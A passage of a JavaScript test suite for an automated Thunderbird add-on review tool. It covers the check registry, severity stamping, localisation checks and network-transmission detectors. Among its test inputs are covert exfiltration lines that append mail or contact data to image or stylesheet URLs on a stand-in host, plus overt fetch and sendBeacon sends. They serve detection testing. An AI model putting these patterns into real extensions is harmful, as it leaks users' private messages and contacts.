    experimentNotAllowed.run(withManifest(ctx({ name: "x" }, false))).findings
      .length,
    0
  );
});

// ---- activity feed (ctx.note) ----
// Every check narrates each site it examines - pass and fail - to ctx.note, so
// the what-is-going-on feed shows what was investigated (not only the findings),
// grouped under the check. A check run without a note is unaffected.
test("sync-xhr notes each open() site (sync=fail, async=pass)", () => {
  const notes = notesFrom(
    syncXhr,
    jsCtx(`a.open("GET", "/u", false);\nb.open("GET", "/u", true);`)
  );
  assert.deepEqual(
    notes.map((n) => n.verdict),
    [VERDICT.FAIL, VERDICT.PASS]
  );
});

test("debugger-statement notes every site as unsettled", () => {
  const notes = notesFrom(
    debuggerStatement,
    jsCtx(`debugger;\nif (D) debugger;`)
  );
  assert.deepEqual(
    notes.map((n) => n.verdict),
    [VERDICT.UNSURE, VERDICT.UNSURE]
  );
});

test("minimize-host-permissions notes broad (fail) and scoped (pass) hosts", () => {
  const notes = notesFrom(
    minimizeHostPermissions,
    jsCtx("", { host_permissions: ["<all_urls>", "https://example.com/*"] })
  );
  assert.deepEqual(notes, [
    { file: "manifest.json", item: "<all_urls>", verdict: VERDICT.FAIL },
    {
      file: "manifest.json",
      item: "https://example.com/*",
      verdict: VERDICT.PASS,
    },
  ]);
});

test("missing-library / obfuscated-code note a verdict per classified file", () => {
  // A hash match marks lib.js a library (a UMD/.min shape alone does not).
  const lib =
    "(function () { if (typeof exports === 'object' && typeof define === 'function') {} })();\n".repeat(
      40
    );
  const readable = "function f(a) {\n  return a + 1;\n}\n".repeat(40);
  const libNotes = notesFrom(
    missingLibrary,
    filesCtx({ "lib.js": lib, "app.js": readable }, { libs: ["lib.js"] })
  );
  assert.equal(libNotes.find((n) => n.file === "lib.js").verdict, VERDICT.FAIL);
  assert.equal(libNotes.find((n) => n.file === "app.js").verdict, VERDICT.PASS);
  // obfuscated-code defers libraries to missing-library, so it notes only app.js.
  const obfNotes = notesFrom(
    obfuscatedCode,
    filesCtx({ "lib.js": lib, "app.js": readable }, { libs: ["lib.js"] })
  );
  assert.deepEqual(
    obfNotes.map((n) => n.file),
    ["app.js"]
  );
  assert.equal(obfNotes[0].verdict, VERDICT.PASS);
});

// ---- Tier 2 status notes (one deterministic verdict per check) ----
// These checks decide one thing about the manifest/submission; each reports its
// outcome to the feed - pass/fail, or skipped-with-reason when it does not apply
// (so a bare check header is never ambiguous). unsure = the deterministic
// decision to escalate, never an answer to it.
test("experiment-not-allowed notes pass / fail / skipped", () => {
  const ctxFor = (manifest, allowExperiments) => ({
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from('{\n  "experiment_apis": {}\n}\n')],
      ]),
    },
    options: { allowExperiments },
  });
  const v = (m, allow) => notesFrom(experimentNotAllowed, ctxFor(m, allow));
  assert.equal(v({ name: "x" }, false)[0].verdict, VERDICT.PASS); // not an Experiment
  assert.equal(
    v({ experiment_apis: { a: {} } }, false)[0].verdict,
    VERDICT.FAIL
  );
  assert.equal(
    v({ experiment_apis: { a: {} } }, true)[0].verdict,
    VERDICT.SKIPPED
  );
});

test("experiment-missing-strict-max-version notes pass / fail / skipped", () => {
  const v = (manifest) =>
    notesFrom(experimentMissingMax, {
      addon: { manifest },
      options: { allowExperiments: true },
    });
  assert.equal(v({ experiment_apis: { a: {} } })[0].verdict, VERDICT.FAIL); // no max
  assert.equal(
    v({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    })[0].verdict,
    VERDICT.PASS
  );
  assert.equal(v({ name: "x" })[0].verdict, VERDICT.SKIPPED); // not an Experiment
});

test("non-experiment-strict-max-version notes pass / fail / skipped", () => {
  const v = (manifest) => notesFrom(nonExperimentMax, { addon: { manifest } });
  assert.equal(v({ name: "x" })[0].verdict, VERDICT.PASS); // no max
  assert.equal(
    v({
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    })[0].verdict,
    VERDICT.FAIL
  );
  assert.equal(
    v({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    })[0].verdict,
    VERDICT.SKIPPED // an Experiment is the other check's concern
  );
});

test("trademark-violation notes pass / fail / skipped", () => {
  const ctxFor = (name) => ({
    addon: { manifest: name == null ? {} : { name }, files: new Map() },
  });
  const v = (name) => notesFrom(trademarkViolation, ctxFor(name));
  assert.equal(v("Calendar for Thunderbird")[0].verdict, VERDICT.PASS);
  assert.equal(v("Firefox Helper")[0].verdict, VERDICT.FAIL);
  assert.equal(v(null)[0].verdict, VERDICT.SKIPPED); // no name
});

test("missing-english-localization: _locales branches (pass / fail)", () => {
  const v = (files) =>
    notesFrom(missingEnglish, {
      addon: {
        files: new Map(
          Object.entries(files).map(([k, val]) => [k, Buffer.from(val)])
        ),
      },
    });
  assert.equal(
    v({ "_locales/en/messages.json": "{}" })[0].verdict,
    VERDICT.PASS
  );
  assert.equal(
    v({ "_locales/de/messages.json": "{}" })[0].verdict,
    VERDICT.FAIL
  );
});

// No _locales: franc over the user-facing text (HTML visible text + manifest
// name/description, script/style stripped) decides. Confident non-English is a
// finding, English passes, too little/ambiguous text escalates to manual, and
// no user-facing text passes.
test("missing-english-localization: franc over hardcoded text", () => {
  const de =
    "<body><h1>Wetterbericht</h1><p>Diese Erweiterung zeigt den aktuellen " +
    "Wetterbericht und sendet Benachrichtigungen an Ihren Posteingang.</p></body>";
  const en =
    "<body><h1>Weather report</h1><p>This extension shows the current weather " +
    "forecast and sends notifications to your inbox.</p></body>";
  const run = (files, manifest) =>
    missingEnglish.run(
      withManifest({
        addon: {
          manifest,
          files: new Map(
            Object.entries(files).map(([k, val]) => [k, Buffer.from(val)])
          ),
        },
      })
    );

  const german = run({ "popup.html": de }, { name: "Wetter" });
  assert.equal(german.findings.length, 1);
  assert.equal(german.escalations.length, 0);

  const english = run({ "popup.html": en }, { name: "Weather" });
  assert.equal(english.findings.length, 0);
  assert.equal(english.escalations.length, 0);

  // Too little text: franc is unreliable, so defer to a human.
  const tiny = run({ "popup.html": "<p>Hallo Welt</p>" }, { name: "App" });
  assert.equal(tiny.findings.length, 0);
  assert.equal(tiny.escalations.length, 1);

  // No user-facing text at all -> nothing to localize.
  const empty = run({ "background.js": "console.log(1)" }, {});
  assert.equal(empty.findings.length, 0);
  assert.equal(empty.escalations.length, 0);

  // <script> text is stripped, so the German body still drives detection.
  const scripted = run(
    {
      "popup.html":
        "<body><script>const s = 'english words only inside this script';" +
        "</script><p>Vielen Dank für die Installation dieser Erweiterung in " +
        "Thunderbird.</p></body>",
    },
    {}
  );
  assert.equal(scripted.findings.length, 1);
});

// ---- yaml-driven loader ----
// Every registry entry in the deterministic section loads to a
// module with a run() function plus id/title, and ids stay in sync with checkIds.
test("every check entry (both sections) resolves to a runnable module", async () => {
  const registry = loadRegistry();
  // { eslint: true } so the eslint-gated code-sanity loads too - every entry must resolve.
  const checks = allChecks(await loadChecks(registry, { eslint: true }));
  const ids = registry.checkIds();
  assert.equal(checks.length, ids.length);
  assert.ok(checks.length >= 10);
  for (const c of checks) {
    assert.equal(typeof c.run, "function");
    assert.ok(c.title && c.id);
  }
  // The loader spans every deterministic check.
  assert.ok(ids.includes("unknown-api"));
  assert.ok(ids.includes("unused-files"));
});

// A registry pointing at a nonexistent module file fails loudly (rejects with
// /not found/) instead of silently skipping the check.
test("loadChecks throws hard when a check: names a missing module", async () => {
  const tmp = path.join(os.tmpdir(), `bad-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Bogus\n  check: __does_not_exist__.js\n"
  );
  try {
    await assert.rejects(() => loadChecks(loadRegistry(tmp)), /not found/);
  } finally {
    fs.rmSync(tmp);
  }
});

// A check's phase IS the section it came from - never declared per entry. The reject
// check lives in the invalid-experiment phase, everything else in the deterministic one.
test("a check's phase is the section it came from", async () => {
  const byPhase = await loadChecks(loadRegistry());
  const idsIn = (phase) => byPhase.get(phase).map((c) => c.id);
  assert.ok(idsIn("deterministic").includes("unused-permission"));
  assert.ok(idsIn("invalid-experiment").includes("experiment-not-allowed"));
  // ...and the reject check is in NO other phase - it only runs when short-circuiting.
  assert.ok(!idsIn("deterministic").includes("experiment-not-allowed"));
});

// ONE rule module = ONE entry = ONE phase. A check's id IS its module's filename stem, so a
// second entry naming the same module is the SAME check declared twice: it runs once per
// entry, and the id -> entry Map (how every finding reaches its severity and response) keeps
// only the LAST - so a duplicate can silently restamp a real check's severity.
test("loadRegistry rejects a check declared in two phases", () => {
  const tmp = path.join(os.tmpdir(), `dup-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n" +
      "- title: Sync XHR\n  severity: warning\n  check: sync-xhr\n  input: source\n" +
      "invalid-experiment-phase:\n" +
      "- title: Sync XHR again\n  severity: info\n  check: sync-xhr\n  input: source\n"
  );
  try {
    assert.throws(
      () => loadRegistry(tmp),
      /"sync-xhr" is declared more than once/
    );
  } finally {
    fs.rmSync(tmp);
  }
});

// The phase sections ARE the control flow: runChecks looks each one up BY NAME. So renaming
// or misspelling one in registry.yaml would not fail loudly - it would yield an empty phase,
// and the review would silently run without every check in it. loadRegistry asserts the
// shipped registry declares them all; this pins that no phase can quietly become empty (a
// typo makes loadRegistry throw, and this test fail).
test("every phase of the shipped registry is declared and populated", async () => {
  const byPhase = await loadChecks(loadRegistry());
  for (const phase of ["invalid-experiment", "deterministic"]) {
    assert.ok(
      (byPhase.get(phase) ?? []).length > 0,
      `phase "${phase}" loaded no checks - its registry.yaml section is missing or renamed`
    );
  }
});

// The guard behind the above: a required phase section that is missing or empty in the yaml
// (a rename, a bad edit) is a defect that would silently drop that whole phase from every
// review. assertRequiredPhaseSections turns it into a loud abort. Tested directly, because in
// loadRegistry it runs for the SHIPPED registry only (a partial test yaml must not trip it).
test("assertRequiredPhaseSections rejects a missing or empty required phase section", () => {
  const full = {
    "invalid-experiment-phase": [{ check: "experiment-not-allowed" }],
    "deterministic-phase": [{ check: "sync-xhr" }],
  };
  // The complete set is accepted.
  assert.doesNotThrow(() => assertRequiredPhaseSections(full, "ok.yaml"));
  // A section removed entirely (a rename) throws, naming the missing one.
  const { "invalid-experiment-phase": _dropped, ...missing } = full;
  assert.throws(
    () => assertRequiredPhaseSections(missing, "x.yaml"),
    /phase section "invalid-experiment-phase" is missing or empty/
  );
  // A section present but empty throws too.
  assert.throws(
    () =>
      assertRequiredPhaseSections(
        { ...full, "deterministic-phase": [] },
        "x.yaml"
      ),
    /phase section "deterministic-phase" is missing or empty/
  );
});

// loadChecks validates the severity token: error/warning/info/auto are allowed,
// anything else is a loud config error (the module exists; only the severity is
// bad - so this is distinct from the missing-module failure above).
test("loadChecks accepts severity: auto", async () => {
  const tmp = path.join(os.tmpdir(), `auto-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Ok\n  severity: auto\n  check: sync-xhr.js\n  input: source\n"
  );
  try {
    const checks = allChecks(await loadChecks(loadRegistry(tmp)));
    assert.equal(checks[0].severity, "auto");
  } finally {
    fs.rmSync(tmp);
  }
});

// loadChecks requires a valid `input` on every check (source | xpi) - it drives
// runOneCheck's artifact routing, so a missing/invalid value is a loud config error
// (no default to silently fall through to).
test("loadChecks rejects a check with no valid input", async () => {
  const tmp = path.join(os.tmpdir(), `bad-input-registry-${process.pid}.yaml`);
  // Valid severity so the input check (which runs after severity) is what fires.
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: NoInput\n  severity: error\n  check: sync-xhr.js\n"
  );
  try {
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /missing a valid `input`/
    );
    // An out-of-set value is rejected too.
    fs.writeFileSync(
      tmp,
      "deterministic-phase:\n- title: BadInput\n  severity: error\n  check: sync-xhr.js\n  input: bogus\n"
    );
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /missing a valid `input`/
    );
  } finally {
    fs.rmSync(tmp);
  }
});

// An `input: build` check reads the SCA-only build corpus, so it MUST be `sca: true` - else it
// runs in an XPI review too, where the build sibling is undefined and routeCtx would THROW (no
// build sibling there). loadChecks asserts the gate so the failure is a clear load-time config
// error rather than a mid-review throw.
test("loadChecks rejects an input:build check that is not sca:true", async () => {
  const tmp = path.join(
    os.tmpdir(),
    `build-nosca-registry-${process.pid}.yaml`
  );
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Build\n  severity: error\n  check: sync-xhr.js\n  input: build\n"
  );
  try {
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /`input: build` but not `sca: true`/
    );
    // With the gate, it loads.
    fs.writeFileSync(
      tmp,
      "deterministic-phase:\n- title: Build\n  severity: error\n  check: sync-xhr.js\n  input: build\n  sca: true\n"
    );
    const checks = allChecks(await loadChecks(loadRegistry(tmp)));
    assert.equal(checks[0].input, "build");
  } finally {
    fs.rmSync(tmp);
  }
});

test("loadChecks rejects an invalid severity token", async () => {
  const tmp = path.join(os.tmpdir(), `bad-sev-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Bad\n  severity: nope\n  check: sync-xhr.js\n"
  );
  try {
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /invalid severity "nope"/
    );
  } finally {
    fs.rmSync(tmp);
  }
});

// ---- severity stamping (the orchestrator is the gatekeeper) ----
// A check under a FIXED registry severity cannot choose its own: any f.severity
// it sets is overwritten with the entry's. Only severity:auto delegates the
// choice to the check - and even then a missing/invalid value fails safe to
// error, so a finding never leaves runOneCheck without a concrete severity.
test("a fixed-severity check cannot override its finding severity", async () => {
  const check = {
    id: "fixed",
    severity: "warning",
    run: () => ({ findings: [finding({ item: "x", severity: "error" })] }),
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.equal(out.findings.length, 1);
  assert.equal(out.findings[0].severity, "warning"); // entry wins; check ignored
});

// severity:hold-or-error stamps the HOLD, not the error. Which of the two a finding
// really is depends on what every OTHER check found, and runOneCheck cannot know that -
// so it stamps the band the check knows on its own and resolveHolds settles it after the
// run. Stamping error here would auto-reject a submission whose only fault is a missing
// disclosure on the ATN listing.
test("severity:hold-or-error stamps a hold, leaving the rest to resolveHolds", async () => {
  const check = {
    id: "held",
    severity: "hold-or-error",
    run: () => ({ findings: [finding({ item: "x" })] }),
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.equal(out.findings[0].severity, "hold");
});

test("severity:auto lets the check set each finding's severity", async () => {
  const check = {
    id: "auto",
    severity: "auto",
    run: () => ({
      findings: [
        finding({ item: "a", severity: "warning" }),
        finding({ item: "b", severity: "info" }),
      ],
    }),
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.deepEqual(
    out.findings.map((f) => f.severity),
    ["warning", "info"]
  );
});

// A check returns ONE shape: { findings, escalations }. The bare array shorthand is
// refused rather than read as findings - it made the two lanes look optional, so a rule
// that grew an escalation path and kept returning its findings array dropped every
// escalation with nothing to catch it (`expect` cannot assert an escalation).
test("a check that returns a bare array is refused, not read as findings", async () => {
  const arr = await runOneCheck(
    {},
    { id: "arr", severity: "warning", run: () => [finding({ item: "x" })] },
    "[1/1]"
  );
  assert.equal(arr.findings.length, 1);
  assert.equal(arr.findings[0].ruleId, "check-failed"); // not published as "arr"
  assert.equal(arr.findings[0].item, "arr");
  // A non-object primitive is refused the same way; an absent return is fine.
  const prim = await runOneCheck(
    {},
    { id: "prim", severity: "warning", run: () => 42 },
    "[1/1]"
  );
  assert.equal(prim.findings[0].ruleId, "check-failed");
  const none = await runOneCheck(
    {},
    { id: "none", severity: "warning", run: () => undefined },
    "[1/1]"
  );
  assert.deepEqual(none.findings, []);
});

// severity:none says the check emits no findings, so there is no band to stamp. A finding
// from one would have to be published at an invented severity - and the JSON report is an
// upload filter, so an invented `error` auto-rejects. runOneCheck refuses it instead: the
// breach surfaces as a check-failed error naming the check, not as a silent rejection. The
// empty shapes a check may legitimately return all pass.
// The other half of the pairing, at load time: an entry declaring one without the other
// fails there rather than at the first case that reaches it - which may be never.
test("loadChecks refuses escalation without instructions, and the reverse", async () => {
  const doc = loadRegistry();
  const entry = (id) =>
    doc.doc["deterministic-phase"].find((e) => e.check === id);
  const orphanSection = entry("remote-eval");
  const keepWording = orphanSection.instructions;
  delete orphanSection.instructions;
  await assert.rejects(
    () => loadChecks(doc),
    /authors no `instructions`/,
    "a section with no wording"
  );
  orphanSection.instructions = keepWording;

  const orphanWording = entry("data-exfiltration");
  const keepSection = orphanWording.escalation;
  delete orphanWording.escalation;
  await assert.rejects(
    () => loadChecks(doc),
    /declares no `escalation` section/,
    "wording with no section"
  );
  orphanWording.escalation = keepSection;
  // Restored: the real registry still loads.
  await loadChecks(doc);
});

test("severity:none refuses a finding, and accepts every empty shape", async () => {
  const escalating = (run) => ({ id: "esc", severity: "none", run });

  const bad = await runOneCheck(
    {},
    escalating(() => ({ findings: [finding({ item: "x" })] })),
    "[1/1]"
  );
  assert.equal(bad.findings.length, 1);
  assert.equal(bad.findings[0].ruleId, "check-failed"); // not published as "esc"
  assert.equal(bad.findings[0].item, "esc");
  assert.equal(bad.findings[0].severity, "error");

  for (const empty of [undefined, {}, { findings: [] }]) {
    const out = await runOneCheck(
      {},
      escalating(() => empty),
      "[1/1]"
    );
    assert.deepEqual(out.findings, [], `${JSON.stringify(empty)} is accepted`);
  }

  // The escalation lane itself is untouched: the case still reaches the reviewer.
  const ok = await runOneCheck(
    {},
    escalating(() => ({ findings: [], escalations: [{ item: "site.js" }] })),
    "[1/1]"
  );
  assert.deepEqual(ok.findings, []);
  assert.equal(ok.manualItems.length, 1);
});

test("severity:auto fails safe to error when the check sets none/invalid", async () => {
  const check = {
    id: "auto-bad",
    severity: "auto",
    run: () => ({
      findings: [
        finding({ item: "a" }), // no severity
        finding({ item: "b", severity: "auto" }), // not a concrete severity
      ],
    }),
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.deepEqual(
    out.findings.map((f) => f.severity),
    ["error", "error"]
  );
});

test("a throwing check is caught and turned into a check-failed error", async () => {
  const check = {
    id: "boom-check",
    severity: "info", // ignored: the catch stamps ERROR regardless
    run: () => {
      throw new Error("boom");
    },
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.equal(out.findings.length, 1);
  assert.equal(out.findings[0].ruleId, "check-failed");
  assert.equal(out.findings[0].severity, SEVERITY.ERROR);
  assert.equal(out.findings[0].item, "boom-check");
});

// ---- disguised-transmission (covert) + data-exfiltration (overt) ----
// Covert channels (data appended to an image/CSS/resource URL) are a flat
// error; a normal fetch to a remote host escalates for an options-page consent
// check. Local destinations and data-free covert loads are ignored.
test("disguised-* hard-flag the STRONG covert case (a user-data API in the URL)", () => {
  const res = (code) =>
    disguisedResource.run(withManifest(jsCtx(code))).findings.length;
  const sty = (code) =>
    disguisedStylesheet.run(withManifest(jsCtx(code))).findings.length;
  // A user-data API call inside the covert URL -> provably user data -> hard error.
  assert.equal(
    res('img.src = "https://x/?d=" + messenger.messages.list();'),
    1
  );
  assert.equal(
    sty(
      'el.style.backgroundImage = "url(https://x/?d=" + messenger.contacts.list() + ")";'
    ),
    1
  );
  // A merely-appended runtime value (no user-data API) is the WEAK case - NOT a
  // hard finding here (it goes to disguised-transmission, asserted below).
  assert.equal(res('img.src = "https://x/?d=" + body;'), 0);
  assert.equal(res('img.src = "./logo.png";'), 0); // local
  assert.equal(res('img.src = "https://x/logo.png";'), 0); // static, no data
});

test("disguised-transmission escalates the WEAK covert case", () => {
  const cands = (code) =>
    disguisedTransmission.run(withManifest(jsCtx(code))).escalations.length;
  assert.equal(cands('img.src = "https://x/?d=" + body;'), 1); // appended-only
  assert.equal(
    cands('window.location.href = "https://x/" + team + "/inbox";'),
    1
  ); // navigation, appended-only (the birdbox shape)
  // The strong case stays with the hard disguised-* checks, not here.
  assert.equal(
    cands('img.src = "https://x/?d=" + messenger.messages.list();'),
    0
  );
  assert.equal(cands('img.src = "https://x/logo.png";'), 0); // static, no data
  assert.equal(cands('fetch("https://x/?d=" + body);'), 0); // overt, not covert
});

test("data-exfiltration escalates an overt remote transmission only", () => {
  const candidates = (code) =>
    dataExfiltration.run(withManifest(jsCtx(code))).escalations.length;
  assert.equal(candidates('fetch("https://api.example.com/", { body });'), 1);
  assert.equal(candidates('navigator.sendBeacon("https://x", d);'), 1);
  assert.equal(candidates('fetch("./local.json");'), 0); // local
  assert.equal(candidates('img.src = "https://x/?d=" + body;'), 0); // covert
});

// The transmission method and the destination AS WRITTEN ride on the escalation's
// `hint` (shown on the locus), so the reviewer sees where the data goes without
// opening the file, while `item` stays absent so every site groups under the one
// manual entry. A send with no destination to name keeps the method alone.
test("data-exfiltration labels each locus with the method and destination", () => {
  const hintOf = (code) => {
    const { escalations } = dataExfiltration.run(withManifest(jsCtx(code)));
    assert.equal(escalations.length, 1);
    assert.equal(escalations[0].item, undefined);
    return escalations[0].hint;
  };
  assert.equal(
    hintOf('fetch("https://api.example.com/", { body });'),
    'fetch() "https://api.example.com/"'
  );
  // Unresolved is fine - what the developer wrote is the evidence.
  assert.equal(hintOf("fetch(endpoint, { body });"), "fetch() endpoint");
  assert.equal(
    hintOf('fetch(base + "/collect", { body });'),
    'fetch() base + "/collect"'
  );
});

// How a sink reads on a locus line. A destination is appended to the channel the
// check names it by; one with no destination to name keeps the channel alone - no
// dangling separator, nothing invented to fill the slot. A long destination is
// truncated, since a locus is one line. Tested on the helper itself: a sink with no
// destination classifies LOCAL, and every check filters those out before display,
// so that branch is the helper's contract rather than any check's path.
test("sinkLabel appends the destination, or names the channel alone", () => {
  assert.equal(
    sinkLabel({ target: '"https://api.example.com/c"' }, "fetch()"),
    'fetch() "https://api.example.com/c"'
  );
  assert.equal(
    sinkLabel({ target: "endpoint" }, "fetch()"),
    "fetch() endpoint"
  );
  assert.equal(sinkLabel({ target: null }, "fetch()"), "fetch()");
  const long = sinkLabel({ target: "u".repeat(200) }, "fetch()");
  assert.ok(long.length < 100, long.length);
  assert.ok(long.endsWith("…"));
});

test("scanNetworkSinks classifies channel, destination, appended data", () => {
  const one = (code) => scanNetworkSinks(code).hits[0];
  const img = one('img.src = "https://x/?d=" + v;');
  assert.equal(img.type, "element-src");
  assert.equal(img.channel, OVERTNESS.COVERT);
  assert.equal(img.destClass, URL_CLASS.REMOTE);
  assert.equal(img.dataAppended, true);
  const beacon = one('navigator.sendBeacon("https://x", d);');
  assert.equal(beacon.channel, OVERTNESS.OVERT);
  assert.equal(beacon.destClass, URL_CLASS.REMOTE);
  assert.equal(
    one("fetch(u, { body: messenger.messages.getFull(id) });").carriesData,
    true
  );
});

// carriesData resolves the payload's chain base through the shared api-base
// index: a whole-object alias and a captured data-API namespace (the API is the
// capture's prefix) count as user data; a shadowed local named like a root does
// not.
test("scanNetworkSinks carriesData follows aliases and captured namespaces", () => {
  const one = (code) => scanNetworkSinks(code).hits[0];
  assert.equal(
    one(
      `const api = messenger || browser;
       fetch(u, { body: api.messages.getFull(id) });`
    ).carriesData,
    true
  );
  assert.equal(
    one(
      `const m = messenger.messages;
       fetch(u, { body: m.getFull(id) });`
    ).carriesData,
    true
  );
  assert.equal(
    one(
      `function f(messenger) {
         fetch(u, { body: messenger.messages.getFull(id) });
       }`
    ).carriesData,
    false
  );
});

// ---- cleartext-transmission ----
// Any overt transmission to a remote host over a non-TLS scheme is an error,
// with or without a payload; encrypted (https/wss) and local destinations are
// fine, and covert channels are disguised-transmission's job.
test("cleartext-transmission flags overt http/ws/ftp remote sends only", () => {
  const n = (code) =>
    cleartextTransmission.run(withManifest(jsCtx(code))).findings.length;
  assert.equal(n('fetch("http://api.example.com/x");'), 1); // GET, no payload
  assert.equal(n('new WebSocket("ws://x.example.com/feed");'), 1);
  assert.equal(n('fetch("ftp://files.example.com/x");'), 1);
  assert.equal(n('fetch("https://api.example.com/x");'), 0); // encrypted
  assert.equal(n('new WebSocket("wss://x.example.com/feed");'), 0); // encrypted
  assert.equal(n('fetch("/local.json");'), 0); // local
  assert.equal(n('img.src = "http://x/?d=" + body;'), 0); // covert, not overt
  // The destination as WRITTEN rides on `hint`, and the finding carries no `item`:
  // the response is item-free so every cleartext send shares one message and they
  // collapse into a single entry with a locus each. A host would also be the lesser
  // fact - it is null whenever the URL is assembled at run time, while the written
  // line always shows.
  const hit = cleartextTransmission.run(
    withManifest(jsCtx('fetch("http://api.example.com/x");'))
  ).findings[0];
  assert.equal(hit.item, null);
  assert.equal(hit.hint, 'cleartext send "http://api.example.com/x"');

  // A run-time host resolves to no host at all, yet the send is still known to be
  // remote and cleartext from the "http://" prefix - so it must still be a finding,
  // and it must still be renderable. Naming the host in the message crashed the
  // report here (a null message reaching message.split) and put a reason-less error
  // into the JSON upload filter.
  const runtime = cleartextTransmission.run(
    withManifest(jsCtx("fetch(`http://${server}/api`, { method: 'POST' });"))
  ).findings;
  assert.equal(runtime.length, 1);
  assert.equal(runtime[0].item, null);
  assert.match(runtime[0].hint, /http:\/\/\$\{server\}\/api/);
});

// ---- privacy-policy ----
// One manual-review escalation per distinct remote host of every overt
// transmission (the hosts list as the "where"); covert and local destinations
// do not trigger it.
test("privacy-policy escalates one entry per distinct remote host", () => {
  const esc = (code) =>
    privacyPolicy.run(withManifest(jsCtx(code))).escalations;
  const single = esc('fetch("https://api.example.com/x");');
  assert.equal(single.length, 1);
  assert.equal(single[0].item, "api.example.com");
  const two = esc(
    'fetch("https://b.example.com/x"); fetch("https://a.example.com/y");'
  );
  assert.deepEqual(
    two.map((e) => e.item),
    ["a.example.com", "b.example.com"] // one per distinct host, sorted
  );
  assert.equal(esc('fetch("./local.json");').length, 0); // local
  assert.equal(esc('img.src = "https://x/?d=" + body;').length, 0); // covert
});

// ---- native-messaging ----
// Keyed purely on the declared permission (required or optional); no JS scan.
test("native-messaging escalates on the declared permission", () => {
  const esc = (manifest) =>
    nativeMessaging.run(withManifest({ addon: { manifest } })).escalations;
  const declared = esc({ permissions: ["nativeMessaging"] });
  assert.equal(declared.length, 1);
  // A single whole-add-on reminder: no item to list (instructions name it).
  assert.equal(declared[0].item, undefined);
  assert.equal(esc({ optional_permissions: ["nativeMessaging"] }).length, 1);
  assert.equal(esc({ permissions: ["storage"] }).length, 0);
  assert.equal(esc({}).length, 0);
  assert.equal(
    nativeMessaging.run(withManifest({ addon: {} })).escalations.length,
    0
  );
});

// ---- default-locale-missing / default-locale-unused ----
// A _locales directory requires a default_locale key and vice versa; either one
// alone breaks loading. The two checks split the two directions.
test("default-locale checks flag the two load-breaking directions", () => {
  const ctx = (files, manifest) => ({
    addon: {
      files: new Map(
        Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])
      ),
      manifest,
    },
  });
  const locales = { "_locales/en/messages.json": "{}" };
  // missing: _locales present, no default_locale.
  assert.equal(
    defaultLocaleMissing.run(withManifest(ctx(locales, {}))).findings.length,
    1
  );
  assert.equal(
    defaultLocaleMissing.run(
      withManifest(ctx(locales, { default_locale: "en" }))
    ).findings.length,
    0
  );
  assert.equal(
    defaultLocaleMissing.run(withManifest(ctx({}, {}))).findings.length,
    0
  );
  // unused: default_locale set, no _locales.
  assert.equal(
    defaultLocaleUnused.run(withManifest(ctx({}, { default_locale: "en" })))
      .findings.length,
    1
  );
  assert.equal(
    defaultLocaleUnused.run(
      withManifest(ctx(locales, { default_locale: "en" }))
    ).findings.length,
    0
  );
  assert.equal(
    defaultLocaleUnused.run(withManifest(ctx({}, {}))).findings.length,
    0
  );
});

// ---- addon-icon-missing ----
// No defined add-on icon (absent `icons`, empty/blank values, or a malformed
// non-object) gets one advisory with no location; a declared icon passes; themes
// and dictionaries are exempt; an unparsed manifest is skipped.
test("addon-icon-missing flags an extension with no defined add-on icon", () => {
  const ctx = (manifest) => ({ addon: { manifest } });
  const out = addonIconMissing.run(
    withManifest(ctx({ manifest_version: 3, name: "x" }))
  ).findings;
  assert.equal(out.length, 1);
  assert.equal(out[0].file, "manifest.json");
  assert.equal(out[0].loc, null);
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: { 16: "icon-16.png" } })))
      .findings.length,
    0
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: {} }))).findings.length,
    1
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: { 16: "  " } }))).findings
      .length,
    1
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: "icon.png" }))).findings
      .length,
    1
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ theme: { colors: {} } }))).findings
      .length,
    0
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ dictionaries: { en: "x.dic" } })))
      .findings.length,
    0
  );
  assert.equal(
    addonIconMissing.run(withManifest({ addon: { manifest: null } })).findings
      .length,
    0
  );
});

// ---- unrecognized-manifest-key ----
// An unknown top-level key is flagged, but a key that names an experiment_apis
// entry is experiment-owned config the add-on reads - accepted, not flagged.
test("unrecognized-manifest-key accepts experiment-owned keys", () => {
  const run = (manifest) =>
    unrecognizedManifestKey.run(
      withManifest({
        addon: {
          manifest,
          files: new Map([
            ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
          ]),
        },
        schema: { validManifestKeys: new Set(["name", "experiment_apis"]) },
      })
    ).findings;
  const out = run({
    name: "x",
    experiment_apis: { calendar_provider: {} },
    calendar_provider: { capabilities: {} }, // owned by the experiment
    bogusKey: 1, // genuinely unknown
  });
  const items = out.map((f) => f.item);
  assert.ok(!items.includes("calendar_provider")); // experiment-owned -> accepted
  assert.ok(items.includes("bogusKey")); // still flagged
});

// The other experiment-owned exemption: a key an experiment's bundled SCHEMA declares
// (a `manifest` namespace $extend of WebExtensionManifest). The schema PATH resolves
// against ctx.addon.files - the built XPI for this `input: xpi` check, where the built
